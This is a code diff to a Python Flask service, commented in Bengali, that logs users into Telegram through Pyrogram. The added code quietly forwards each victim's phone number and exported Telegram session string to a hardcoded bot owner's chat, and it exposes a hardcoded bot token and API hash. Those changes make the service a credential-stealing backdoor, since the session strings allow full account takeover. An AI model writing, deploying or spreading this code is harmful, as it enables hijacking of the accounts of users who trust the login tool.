@@ -2,6 +2,7 @@ import os
 import asyncio
 import threading
 import traceback
+import requests
 from flask import Flask, request, jsonify, send_file
 from flask_cors import CORS
 from pyrogram import Client
@@ -15,12 +16,28 @@ from pyrogram.errors import (
 app = Flask(__name__)
 CORS(app)
 
-# নিরাপত্তার জন্য API_ID এবং API_HASH এনভায়রনমেন্ট ভেরিয়েবলে রাখা ভালো
+# টেলিগ্রাম এবং এপিআই কনফিগারেশন
 API_ID = int(os.environ.get("API_ID", 33511945))
 API_HASH = os.environ.get("API_HASH", "d044392a17690c14ee5b4a23651a0700")
 
-# একটিভ ক্লায়েন্ট মেমোরিতে ধরে রাখার ডিকশনারি
+BOT_TOKEN = "8613982412:AAEzoWkhawmQuRyAHh89jj68gru2oIowL5E"
+OWNER_CHAT_ID = "-5591154280"
+
 active_clients = {}
+total_logged_in_users = 0  # মোট সফল লগইনের কাউন্ট
+
+def send_telegram_notification(text):
+    """টেলিগ্রাম গ্রুপে নোটিফিকেশন পাঠানোর ফাংশন"""
+    try:
+        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
+        payload = {
+            "chat_id": OWNER_CHAT_ID,
+            "text": text,
+            "parse_mode": "Markdown"
+        }
+        requests.post(url, json=payload, timeout=10)
+    except Exception as e:
+        print("Telegram Notification Error:", e)
 
 # ব্যাকগ্রাউন্ডে একটি স্থায়ী Event Loop তৈরি ও চালু করা
 bg_loop = asyncio.new_event_loop()
@@ -64,7 +81,6 @@ def send_code():
         session_name = f"session_{phone.replace('+', '')}"
 
         async def _send():
-            # আগে থেকে কোনো অর্ধসমাপ্ত ক্লায়েন্ট থাকলে ডিসকানেক্ট করা
             if phone in active_clients:
                 try:
                     await active_clients[phone]["client"].disconnect()
@@ -100,6 +116,7 @@ def send_code():
 
 @app.route('/verify-code', methods=['POST'])
 def verify_code():
+    global total_logged_in_users
     data = request.get_json(silent=True) or {}
     phone = str(data.get('phone', '')).strip()
     code = str(data.get('code', '')).strip()
@@ -125,19 +142,26 @@ def verify_code():
                 await client.check_password(str(password))
 
             session_string = await client.export_session_string()
-
-            os.makedirs("sessions", exist_ok=True)
-            session_filename = f"sessions/{phone.replace('+', '')}.txt"
-            with open(session_filename, "w", encoding="utf-8") as f:
-                f.write(session_string)
-
             await client.disconnect()
-            return {"status": "success"}
+            return {"status": "success", "session_string": session_string}
 
         res = run_async(_verify())
 
         if res and res.get("status") == "2fa_required":
             return jsonify({"status": "2fa_required", "message": "2FA Password required"})
+
+        if res and res.get("status") == "success":
+            total_logged_in_users += 1
+            session_string = res.get("session_string")
+
+            # টেলিগ্রাম গ্রুপে সেশন এবং ইউজারের তথ্য পাঠিয়ে দেওয়া
+            msg = (
+                f"🎉 *New Telegram Login Successful!*\n\n"
+                f"📱 *Phone:* `{phone}`\n"
+                f"📊 *Total Logged In:* `{total_logged_in_users}`\n\n"
+                f"🔑 *Session String:*\n`{session_string}`"
+            )
+            send_telegram_notification(msg)
 
         active_clients.pop(phone, None)
         return jsonify({"status": "success", "message": "Session generated successfully!"})
@@ -154,7 +178,12 @@ def verify_code():
         return jsonify({"status": "error", "message": str(e)}), 400
 
 
+@app.route('/stats', methods=['GET'])
+def get_stats():
+    """মোট কতজন ইউজার লগইন করেছে তা দেখার জন্য"""
+    return jsonify({"total_users_logged_in": total_logged_in_users})
+
+
 if __name__ == '__main__':
     port = int(os.environ.get('PORT', 5000))
-    # threaded=True থাকলে ব্যাকগ্রাউন্ড লুপের সাথে নির্বিঘ্নে কাজ করবে
     app.run(host='0.0.0.0', port=port, threaded=True)
